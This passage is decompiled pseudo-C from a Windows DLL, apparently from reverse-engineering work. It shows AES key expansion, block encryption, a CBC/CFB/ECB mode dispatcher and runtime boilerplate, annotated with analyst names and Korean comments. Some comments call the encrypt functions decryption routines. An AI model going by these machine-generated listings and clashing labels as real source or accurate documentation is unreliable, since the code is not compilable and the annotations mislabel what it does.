  if ( IVLen != 16 && IVLen != 24 && IVLen != 32 )
  {
    IVPtr = (int)&unk_1000D8D8;
    exception::exception((exception *)pExceptionObject, (const char *const *)&IVPtr);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
  }
  *(_DWORD *)(this + 968) = keyLen;
  v7 = (const void *)keyPtr;
  *(_DWORD *)(this + 972) = v6;
  qmemcpy((void *)(this + 976), v7, v6);
  qmemcpy((void *)(this + 1008), v7, *(_DWORD *)(this + 972));
  v8 = *(_DWORD *)(this + 968);
  if ( v8 == 16 )
  {
    v9 = *(_DWORD *)(this + 972);
    if ( v9 == 16 )
      v10 = 10;
    else
      v10 = v9 != 24 ? 14 : 12;
    *(_DWORD *)(this + 1040) = v10;
  }
  else if ( v8 == 24 )
  {
    *(_DWORD *)(this + 1040) = *(_DWORD *)(this + 972) != 32 ? 12 : 14;
  }
  else
  {
    *(_DWORD *)(this + 1040) = 14;
  }
  v11 = 0;
  v12 = *(_DWORD *)(this + 1040);
  wordsPerKey = *(_DWORD *)(this + 972) / 4;
  keyLen = wordsPerKey;
  if ( v12 >= 0 )
  {
    v14 = (char *)(this + 8);
    do
    {
      if ( wordsPerKey > 0 )
      {
        memset(v14, 0, 4 * wordsPerKey);
        wordsPerKey = keyLen;
      }
      ++v11;
      v14 += 32;
    }
    while ( v11 <= *(_DWORD *)(this + 1040) );
  }
  v15 = 0;
  if ( *(int *)(this + 1040) >= 0 )
  {
    v16 = (char *)(this + 488);
    do
    {
      if ( wordsPerKey > 0 )
      {
        memset(v16, 0, 4 * wordsPerKey);
        wordsPerKey = keyLen;
      }
      ++v15;
      v16 += 32;
    }
    while ( v15 <= *(_DWORD *)(this + 1040) );
  }
  v17 = this + 1044;
  v18 = *(int *)(this + 968);
  v19 = wordsPerKey * (*(_DWORD *)(this + 1040) + 1);
  IVLen = v19;
  v20 = (BYTE4(v18) & 3) + v18;
  v21 = (unsigned __int8 *)IVPtr;
  v22 = v20 >> 2;
  v48 = v22;
  if ( v22 > 0 )
  {
    IVPtr = v22;
    do
    {
      v17 += 4;
      *(_DWORD *)(v17 - 4) = *v21 << 24;
      v23 = v21 + 1;
      *(_DWORD *)(v17 - 4) |= (unsigned __int8)*v23++ << 16;
      LOBYTE(v24) = 0;
      HIBYTE(v24) = *v23;
      *(_DWORD *)(v17 - 4) |= v24;
      *(_DWORD *)(v17 - 4) |= (unsigned __int8)*++v23;
      v21 = v23 + 1;
      --IVPtr;
    }
    while ( IVPtr );
  }
  v25 = 0;
  if ( v22 <= 0 )
  {
LABEL_36:
    if ( v25 < v19 )
    {
      keyPtr = (int)&unk_1000AC3C;
      while ( 1 )
      {
        IVPtr = *(_DWORD *)(this + 4 * v22 + 1040);
        v29 = keyPtr + 1;
        *(_DWORD *)(this + 1044) ^= (unsigned __int8)byte_10007A3C[HIBYTE(IVPtr)] ^ (((unsigned __int8)byte_10007A3C[(unsigned __int8)IVPtr] ^ (((unsigned __int8)byte_10007A3C[BYTE1(IVPtr)] ^ ((*(char *)keyPtr ^ byte_10007A3C[BYTE2(IVPtr)]) << 8)) << 8)) << 8);
        keyPtr = v29;
        if ( v22 == 8 )
        {
          v32 = (_DWORD *)(this + 1048);
          v33 = 3;
          do
          {
            *v32 ^= *(v32 - 1);
            ++v32;
            --v33;
          }
          while ( v33 );
          IVPtr = *(_DWORD *)(this + 1056);
          v34 = 3;
          *(_DWORD *)(this + 1060) ^= (unsigned __int8)byte_10007A3C[(unsigned __int8)IVPtr] ^ (((unsigned __int8)byte_10007A3C[BYTE1(IVPtr)] ^ (((unsigned __int8)byte_10007A3C[BYTE2(IVPtr)] ^ (byte_10007A3C[HIBYTE(IVPtr)] << 8)) << 8)) << 8);
          v35 = (_DWORD *)(this + 1064);
          do
          {
            *v35 ^= *(v35 - 1);
            ++v35;
            --v34;
          }
          while ( v34 );
        }
        else if ( v22 > 1 )
        {
          v30 = (_DWORD *)(this + 1048);
          v31 = v22 - 1;
          do
          {
            *v30 ^= *(v30 - 1);
            ++v30;
            --v31;
          }
          while ( v31 );
        }
        IVPtr = 0;
        if ( v22 > 0 )
          break;
LABEL_51:
        wordsPerKey = keyLen;
        if ( v25 >= IVLen )
          goto LABEL_52;
      }
      v36 = (int *)(this + 1044);
      while ( 1 )
      {
        wordsPerKey = keyLen;
        if ( v25 >= IVLen )
          break;
        v37 = *v36++;
        v38 = v25 / keyLen;
        v39 = v25 % keyLen;
        *(_DWORD *)(this + 4 * (v25 % keyLen + 8 * v38) + 8) = v37;
        v22 = v48;
        v40 = IVPtr + 1;
        ++v25;
        v41 = IVPtr + 1 < v48;
        *(_DWORD *)(this + 4 * (v39 + 8 * (*(_DWORD *)(this + 1040) - v38)) + 488) = *(v36 - 1);
        IVPtr = v40;
        if ( !v41 )
          goto LABEL_51;
      }
    }
  }
  else
  {
    IVPtr = this + 1044;
    while ( v25 < v19 )
    {
      keyPtr = v25 % wordsPerKey;
      *(_DWORD *)(this + 4 * (v25 % wordsPerKey + 8 * (v25 / wordsPerKey)) + 8) = *(_DWORD *)IVPtr;
      v26 = *(_DWORD *)(this + 1040) - v25 / wordsPerKey;
      ++v25;
      v27 = keyPtr + 8 * v26;
      v28 = IVPtr + 4;
      *(_DWORD *)(this + 4 * v27 + 488) = *(_DWORD *)IVPtr;
      v19 = IVLen;
      IVPtr = v28;
      if ( v25 >= v22 )
        goto LABEL_36;
    }
  }
LABEL_52:
  v42 = *(_DWORD *)(this + 1040);
  result = 1;
  IVLen = 1;
  if ( v42 > 1 )
  {
    v44 = this + 520;
    do
    {
      if ( wordsPerKey > 0 )
      {
        v45 = (int *)v44;
        v46 = wordsPerKey;
        do
        {
          IVPtr = *v45++;
          --v46;
          *(v45 - 1) = dword_1000A83C[(unsigned __int8)IVPtr] ^ dword_1000A43C[BYTE1(IVPtr)] ^ dword_1000A03C[BYTE2(IVPtr)] ^ dword_10009C3C[HIBYTE(IVPtr)];
        }
        while ( v46 );
        wordsPerKey = keyLen;
      }
      v47 = *(_DWORD *)(this + 1040);
      result = IVLen + 1;
      v44 += 32;
      ++IVLen;
    }
    while ( IVLen < v47 );
  }
  *(_BYTE *)(this + 4) = 1;
  return result;
}


// --- Metadata ---
// Function Name: AESEncryptBlock_10006280
// Address: 0x10006280
// Signature: unknown_signature
// ---------------
_BYTE *__thiscall AESEncryptBlock_10006280(int this, unsigned __int8 *a2, _BYTE *a3)
{
  _DWORD *v3; // ebp
  int v4; // ebx
  unsigned __int16 v5; // cx
  int v6; // edx
  int v7; // ecx
  int v8; // eax
  int v9; // esi
  _DWORD *v10; // ebp
  int v11; // esi
  int v12; // edi
  int v13; // edx
  int v14; // ecx
  int v15; // ebx
  int v16; // edx
  int v17; // ebx
  bool v18; // zf
  int v19; // esi
  int v20; // edi
  _DWORD *v21; // esi
  _BYTE *result; // eax
  int v23; // [esp+4h] [ebp-24h]
  int v24; // [esp+8h] [ebp-20h]
  int v25; // [esp+Ch] [ebp-1Ch]
  __int16 v26; // [esp+12h] [ebp-16h]
  int v27; // [esp+14h] [ebp-14h]
  char pExceptionObject[12]; // [esp+1Ch] [ebp-Ch] BYREF
  int v30; // [esp+2Ch] [ebp+4h]
  unsigned int v31; // [esp+2Ch] [ebp+4h]
  unsigned int v32; // [esp+2Ch] [ebp+4h]
  int v33; // [esp+2Ch] [ebp+4h]

  v3 = (_DWORD *)this;
  if ( !*(_BYTE *)(this + 4) )                  // AES 블록 복호화
  {
    exception::exception((exception *)pExceptionObject, (const char *const *)&off_1000D8CC);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
  }
  v4 = *(_DWORD *)(this + 8);
  LOBYTE(v5) = 0;
  HIBYTE(v5) = a2[2];
  LOWORD(v6) = v4 ^ (a2[3] | v5);
  v25 = v4 ^ (a2[3] | v5 | (a2[1] << 16) | (*a2 << 24));
  LOBYTE(v5) = 0;
  HIBYTE(v5) = a2[6];
  v24 = v3[3] ^ (a2[7] | v5 | (a2[5] << 16) | (a2[4] << 24));
  LOBYTE(v4) = 0;
  BYTE1(v4) = a2[10];
  v7 = v3[4] ^ (a2[11] | (unsigned __int16)v4 | (a2[9] << 16) | (a2[8] << 24));
  v26 = HIWORD(v7);
  BYTE1(v4) = a2[14];
  LOBYTE(v4) = a2[15];
  v8 = ((a2[13] << 16) | (a2[12] << 24) | (unsigned __int16)v4) ^ v3[5];
  v9 = v3[260];
  v23 = v8;
  v27 = v9;
  if ( v9 > 1 )
  {
    v10 = v3 + 12;
    v30 = v9 - 1;
    do
    {
      v10 += 8;
      v11 = *(v10 - 9) ^ dword_1000883C[(unsigned __int8)v6] ^ dword_10007C3C[HIBYTE(v24)] ^ dword_1000803C[(unsigned __int8)v26] ^ dword_1000843C[BYTE1(v8)];
      v12 = *(v10 - 8) ^ dword_1000883C[(unsigned __int8)v24] ^ dword_1000843C[BYTE1(v6)] ^ dword_10007C3C[HIBYTE(v26)] ^ dword_1000803C[BYTE2(v23)];
      v8 = *(v10 - 7) ^ dword_1000883C[(unsigned __int8)v7] ^ dword_1000803C[BYTE2(v25)] ^ dword_1000843C[BYTE1(v24)] ^ dword_10007C3C[HIBYTE(v23)];
      v13 = BYTE1(v7);
      v14 = BYTE2(v24);
      v24 = v11;
      v15 = dword_1000803C[v14];
      v7 = (unsigned __int8)v23;
      v16 = dword_10007C3C[HIBYTE(v25)] ^ v15 ^ dword_1000843C[v13];
      v23 = v8;
      v17 = dword_1000883C[v7];
      LOWORD(v7) = v12;
      v6 = *(v10 - 10) ^ v17 ^ v16;
      v18 = v30 == 1;
      v25 = v6;
      v26 = HIWORD(v12);
      --v30;
    }
    while ( !v18 );
    v9 = v27;
    v3 = (_DWORD *)this;
  }
  v19 = 8 * v9;
  v20 = v3[v19 + 2];
  v21 = &v3[v19 + 2];
  result = a3;
  *a3 = HIBYTE(v20) ^ byte_10007A3C[HIBYTE(v25)];
  a3[1] = BYTE2(v20) ^ byte_10007A3C[BYTE2(v24)];
  a3[2] = BYTE1(v20) ^ byte_10007A3C[BYTE1(v7)];
  a3[3] = v20 ^ byte_10007A3C[(unsigned __int8)v23];
  v31 = v21[1];
  a3[4] = HIBYTE(v31) ^ byte_10007A3C[HIBYTE(v24)];
  a3[5] = ((unsigned __int16)(v31 >> 8) >> 8) ^ byte_10007A3C[(unsigned __int8)v26];
  a3[6] = BYTE1(v31) ^ byte_10007A3C[BYTE1(v23)];
  a3[7] = v31 ^ byte_10007A3C[(unsigned __int8)v25];
  v32 = v21[2];
  a3[8] = HIBYTE(v32) ^ byte_10007A3C[HIBYTE(v26)];
  a3[9] = ((unsigned __int16)(v32 >> 8) >> 8) ^ byte_10007A3C[BYTE2(v23)];
  a3[10] = BYTE1(v32) ^ byte_10007A3C[BYTE1(v25)];
  a3[11] = v32 ^ byte_10007A3C[(unsigned __int8)v24];
  v33 = v21[3];
  a3[12] = HIBYTE(v33) ^ byte_10007A3C[HIBYTE(v23)];
  a3[13] = BYTE2(v33) ^ byte_10007A3C[BYTE2(v25)];
  a3[14] = BYTE1(v33) ^ byte_10007A3C[BYTE1(v24)];
  a3[15] = v33 ^ byte_10007A3C[(unsigned __int8)v7];
  return result;
}


// --- Metadata ---
// Function Name: AESGenericEncryptBlock_10006640
// Address: 0x10006640
// Signature: unknown_signature
// ---------------
int __thiscall AESGenericEncryptBlock_10006640(int this, unsigned __int8 *a2, _BYTE *a3)
{
  int result; // eax
  int v5; // kr00_4
  int v6; // ebx
  int v7; // eax
  int v8; // eax
  int v9; // edx
  int v10; // ecx
  int *v11; // eax
  unsigned __int8 *v12; // esi
  unsigned __int8 *v13; // esi
  int v14; // edi
  unsigned __int16 v15; // cx
  int *v16; // edi
  bool v17; // zf
  int v18; // esi
  int v19; // eax
  int v20; // ecx
  int v21; // edi
  int v22; // ecx
  bool v23; // cc
  _BYTE *v24; // esi
  int v25; // edi
  int v26; // ecx
  _BYTE *v27; // esi
  _DWORD *v28; // [esp+10h] [ebp-30h]
  int v29; // [esp+10h] [ebp-30h]
  int v30; // [esp+14h] [ebp-2Ch]
  int v31; // [esp+18h] [ebp-28h]
  _DWORD *v32; // [esp+18h] [ebp-28h]
  int v33; // [esp+1Ch] [ebp-24h]
  int v34; // [esp+20h] [ebp-20h]
  int v35; // [esp+28h] [ebp-18h]
  int v36; // [esp+2Ch] [ebp-14h]
  int v37; // [esp+30h] [ebp-10h]
  int v38; // [esp+30h] [ebp-10h]
  char pExceptionObject[12]; // [esp+34h] [ebp-Ch] BYREF
  int v40; // [esp+44h] [ebp+4h]
  int v41; // [esp+44h] [ebp+4h]
  int v42; // [esp+48h] [ebp+8h]

  if ( !*(_BYTE *)(this + 4) )                  // 블록 크기에 따른 복호화 분기 처리 
  {
    exception::exception((exception *)pExceptionObject, (const char *const *)&off_1000D8CC);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
  }
  if ( *(_DWORD *)(this + 972) == 16 )
    return (int)AESEncryptBlock_10006280(this, a2, a3);
  v5 = *(_DWORD *)(this + 972);
  v6 = v5 / 4;
  if ( v5 / 4 == 4 )
    v7 = 0;
  else
    v7 = (v6 != 6) + 1;
  v8 = 8 * v7;
  v9 = dword_1000AC64[v8];
  v10 = dword_1000AC6C[v8];
  v37 = v9;
  v34 = dword_1000AC74[v8];
  v30 = v10;
  v11 = (int *)(this + 1108);
  if ( v6 > 0 )
  {
    v12 = a2;
    v28 = (_DWORD *)(this + 8);
    v31 = v5 / 4;
    do
    {
      *v11 = *v12 << 24;
      v13 = v12 + 1;
      v14 = (*v13++ << 16) | *v11;
      LOBYTE(v15) = 0;
      *v11 = v14;
      HIBYTE(v15) = *v13++;
      *v11 = v15 | v14;
      v16 = v11;
      *v11 |= *v13;
      v12 = v13 + 1;
      ++v11;
      *v16 ^= *v28;
      v17 = v31 == 1;
      ++v28;
      --v31;
    }
    while ( !v17 );
    v10 = v30;
  }
  result = 1;
  v33 = 1;
  if ( *(int *)(this + 1040) > 1 )
  {
    v40 = this + 40;
    do
    {
      if ( v6 > 0 )
      {
        v18 = v9;
        v32 = (_DWORD *)v40;
        v19 = v10 - v9;
        v20 = v34 - v9;
        v21 = this + 1076;
        v35 = v19;
        v29 = v5 / 4;
        while ( 1 )
        {
          v21 += 4;
          v22 = *v32++ ^ dword_10007C3C[*(unsigned __int8 *)(v21 + 31)] ^ dword_1000803C[*(unsigned __int8 *)(this + 4 * (v18 % v6) + 1110)] ^ dword_1000883C[(unsigned __int8)*(_DWORD *)(this + 4 * ((v20 + v18) % v6) + 1108)] ^ dword_1000843C[*(unsigned __int8 *)(this + 4 * ((v18 + v19) % v6) + 1109)];
          *(_DWORD *)(v21 - 4) = v22;
          ++v18;
          if ( !--v29 )
            break;
          v20 = v34 - v9;
          v19 = v35;
        }
        v9 = v37;
      }
      qmemcpy((void *)(this + 1108), (const void *)(this + 1076), 4 * v6);
      result = v33 + 1;
      v23 = v33 + 1 < *(_DWORD *)(this + 1040);
      v10 = v30;
      ++v33;
      v40 += 32;
    }
    while ( v23 );
  }
  v41 = 0;
  if ( v6 > 0 )
  {
    v24 = a3;
    v42 = this + 1108;
    v25 = v10;
    v38 = v9 - v10;
    v36 = v34 - v10;
    do
    {
      v26 = *(_DWORD *)(this + 4 * (v41 + 8 * *(_DWORD *)(this + 1040)) + 8);
      *v24 = HIBYTE(v26) ^ byte_10007A3C[*(unsigned __int8 *)(v42 + 3)];
      v27 = v24 + 1;
      *v27++ = BYTE2(v26) ^ byte_10007A3C[*(unsigned __int8 *)(this + 4 * ((v38 + v25) % v6) + 1110)];
      *v27++ = BYTE1(v26) ^ byte_10007A3C[*(unsigned __int8 *)(this + 4 * (v25 % v6) + 1109)];
      *v27 = v26 ^ byte_10007A3C[(unsigned __int8)*(_DWORD *)(this + 4 * ((v36 + v25) % v6) + 1108)];
      v24 = v27 + 1;
      result = v41 + 1;
      ++v25;
      v41 = result;
      v42 += 4;
    }
    while ( result < v6 );
  }
  return result;
}


// --- Metadata ---
// Function Name: AESEncryptWithMode_10006940
// Address: 0x10006940
// Signature: unknown_signature
// ---------------
unsigned int __thiscall AESEncryptWithMode_10006940(int this, int a2, char *a3, unsigned int a4, int a5)
{
  unsigned int v6; // ecx
  unsigned int result; // eax
  char *v9; // ebp
  _BYTE *v10; // eax
  int v11; // edi
  char *v12; // ebp
  char *v13; // eax
  int i; // esi
  unsigned int v15; // ecx
  unsigned __int8 *v16; // esi
  char *v17; // ebp
  unsigned int v18; // ecx
  char pExceptionObject[12]; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v20; // [esp+2Ch] [ebp+10h]
  unsigned int v21; // [esp+2Ch] [ebp+10h]

  if ( !*(_BYTE *)(this + 4) )                  // 모드에 따른 AES 분기 처리, CBC, CFB, ECB
  {
    exception::exception((exception *)pExceptionObject, (const char *const *)&off_1000D8CC);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
  }
  if ( !a4 || (v6 = *(_DWORD *)(this + 972), a4 % v6) )
  {
    exception::exception((exception *)pExceptionObject, (const char *const *)&off_1000D8D0);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
  }
  if ( a5 == 1 )
  {
    result = a4 / v6;
    v20 = 0;
    if ( a4 / v6 )
    {
      v9 = (char *)(this + 1008);
      do
      {
        v10 = (_BYTE *)(this + 1008);
        if ( !*(_BYTE *)(this + 4) )
        {
          exception::exception((exception *)pExceptionObject, (const char *const *)&off_1000D8CC);
          CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
        }
        v11 = 0;
        if ( (int)v6 > 0 )
        {
          do
          {
            *v10 ^= v10[a2 - (_DWORD)v9];
            ++v10;
            ++v11;
          }
          while ( v11 < *(_DWORD *)(this + 972) );
        }
        AESGenericEncryptBlock_10006640(this, (unsigned __int8 *)(this + 1008), a3);
        qmemcpy(v9, a3, *(_DWORD *)(this + 972));
        v6 = *(_DWORD *)(this + 972);
        a2 += v6;
        a3 += v6;
        result = a4 / v6;
        ++v20;
      }
      while ( v20 < a4 / v6 );
    }
  }
  else
  {
    v21 = 0;
    if ( a5 == 2 )
    {
      result = a4 / v6;
      v12 = a3;
      if ( a4 / v6 )
      {
        do
        {
          AESGenericEncryptBlock_10006640(this, (unsigned __int8 *)(this + 1008), v12);
          v13 = v12;
          if ( !*(_BYTE *)(this + 4) )
          {
            exception::exception((exception *)pExceptionObject, (const char *const *)&off_1000D8CC);
            CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
          }
          for ( i = 0; i < *(_DWORD *)(this + 972); ++i )
            *v13++ ^= *(_BYTE *)(i + a2);
          qmemcpy((void *)(this + 1008), v12, *(_DWORD *)(this + 972));
          v15 = *(_DWORD *)(this + 972);
          result = a4 / v15;
          v12 += v15;
          a2 += v15;
          ++v21;
        }
        while ( v21 < a4 / v15 );
      }
    }
    else
    {
      result = a4 / v6;
      v16 = (unsigned __int8 *)a2;
      v17 = a3;
      if ( a4 / v6 )
      {
        do
        {
          AESGenericEncryptBlock_10006640(this, v16, v17);
          v18 = *(_DWORD *)(this + 972);
          v16 += v18;
          v17 += v18;
          ++v21;
          result = a4 / v18;
        }
        while ( v21 < a4 / v18 );
      }
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: ??2@YAPAXI@Z
// Address: 0x10006BA0
// Signature: unknown_signature
// ---------------
// attributes: thunk
void *__cdecl operator new(unsigned int a1)
{
  return __imp_??2@YAPAXI@Z(a1);
}


// --- Metadata ---
// Function Name: __CxxFrameHandler
// Address: 0x10006BA6
// Signature: unknown_signature
// ---------------
// attributes: thunk
int _CxxFrameHandler()
{
  return __CxxFrameHandler();
}


// --- Metadata ---
// Function Name: ??3@YAXPAX@Z
// Address: 0x10006BB0
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __cdecl operator delete(void *a1)
{
  __imp_??3@YAXPAX@Z(a1);
}


// --- Metadata ---
// Function Name: _except_handler3
// Address: 0x10006BB6
// Signature: unknown_signature
// ---------------
// attributes: thunk
int except_handler3()
{
  return _except_handler3();
}


// --- Metadata ---
// Function Name: _local_unwind2
// Address: 0x10006BBC
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __cdecl local_unwind2(int a1, int a2)
{
  return _local_unwind2(a1, a2);
}


// --- Metadata ---
// Function Name: __alloca_probe
// Address: 0x10006BD0
// Signature: unknown_signature
// ---------------
void __usercall _alloca_probe(unsigned int a1@<eax>, char a2)
{
  char *i; // ecx

  for ( i = &a2; a1 >= 0x1000; a1 -= 4096 )
    i -= 4096;
  __asm { retn }
}


// --- Metadata ---
// Function Name: _ftol
// Address: 0x10006C00
// Signature: unknown_signature
// ---------------
// attributes: thunk
signed __int64 __usercall ftol@<edx:eax>(double a1@<st0>)
{
  return _ftol(a1);
}


// --- Metadata ---
// Function Name: ??0exception@@QAE@ABV0@@Z
// Address: 0x10006C06
// Signature: unknown_signature
// ---------------
// attributes: thunk
exception *__thiscall exception::exception(exception *this, const struct exception *a2)
{
  return __imp_??0exception@@QAE@ABV0@@Z(this, a2);
}


// --- Metadata ---
// Function Name: ??_Gtype_info@@UAEPAXI@Z
// Address: 0x10006C0C
// Signature: unknown_signature
// ---------------
type_info *__thiscall type_info::`scalar deleting destructor'(type_info *this, char a2)
{
  type_info::~type_info(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: ??1exception@@UAE@XZ
// Address: 0x10006C28
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __thiscall exception::~exception(exception *this)
{
  __imp_??1exception@@UAE@XZ(this);
}


// --- Metadata ---
// Function Name: _CxxThrowException
// Address: 0x10006C2E
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __stdcall __noreturn CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo)
{
  _CxxThrowException(pExceptionObject, pThrowInfo);
}


// --- Metadata ---
// Function Name: __CRT_INIT@12
// Address: 0x10006C34
// Signature: unknown_signature
// ---------------
int __stdcall _CRT_INIT(int a1, int a2, int a3)
{
  _DWORD *v3; // eax
  void (**v5)(void); // eax
  void (**i)(void); // esi

  if ( !a2 )
  {
    if ( dword_1000DDC0 <= 0 )
      return 0;
    --dword_1000DDC0;
  }
  dword_1000DDC4 = adjust_fdiv;
  if ( a2 == 1 )
  {
    v3 = malloc(0x80u);
    Block = v3;
    if ( !v3 )
      return 0;
    *v3 = 0;
    dword_1000DDC8 = (int)Block;
    initterm(&First, &Last);
    ++dword_1000DDC0;
  }
  else if ( !a2 )
  {
    v5 = (void (**)(void))Block;
    if ( Block )
    {
      for ( i = (void (**)(void))(dword_1000DDC8 - 4); i >= v5; --i )
      {
        if ( *i )
        {
          (*i)();
          v5 = (void (**)(void))Block;
        }
      }
      free(v5);
      Block = 0;
    }
  }
  return 1;
}


// --- Metadata ---
// Function Name: DllEntryPoint
// Address: 0x10006CDF
// Signature: unknown_signature
// ---------------
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  bool v4; // zf
  BOOL v6; // eax
  DWORD fdwReasona; // [esp+18h] [ebp+Ch]

  if ( fdwReason )
  {
    if ( fdwReason != 1 && fdwReason != 2 )
      goto LABEL_10;
    if ( dword_1000DDD0 && !dword_1000DDD0(hinstDLL, fdwReason, lpReserved) )
      return 0;
    v4 = _CRT_INIT((int)hinstDLL, fdwReason, (int)lpReserved) == 0;
  }
  else
  {
    v4 = dword_1000DDC0 == 0;
  }
  if ( v4 )
    return 0;
LABEL_10:
  v6 = DllMain(hinstDLL, fdwReason, lpReserved);
  fdwReasona = v6;
  if ( fdwReason != 1 )
  {
LABEL_13:
    if ( !fdwReason || fdwReason == 3 )
    {
      if ( !_CRT_INIT((int)hinstDLL, fdwReason, (int)lpReserved) )
        fdwReasona = 0;
      if ( fdwReasona )
      {
        if ( dword_1000DDD0 )
          fdwReasona = dword_1000DDD0(hinstDLL, fdwReason, lpReserved);
      }
    }
    return fdwReasona;
  }
  if ( !v6 )
  {
    _CRT_INIT((int)hinstDLL, 0, (int)lpReserved);
    goto LABEL_13;
  }
  return fdwReasona;
}


// --- Metadata ---
// Function Name: ??1type_info@@UAE@XZ
// Address: 0x10006D7C
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __thiscall type_info::~type_info(type_info *this)
{
  __imp_??1type_info@@UAE@XZ(this);
}


// --- Metadata ---
// Function Name: _initterm
// Address: 0x10006D82
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __cdecl initterm(_PVFV *First, _PVFV *Last)
{
  _initterm(First, Last);
}


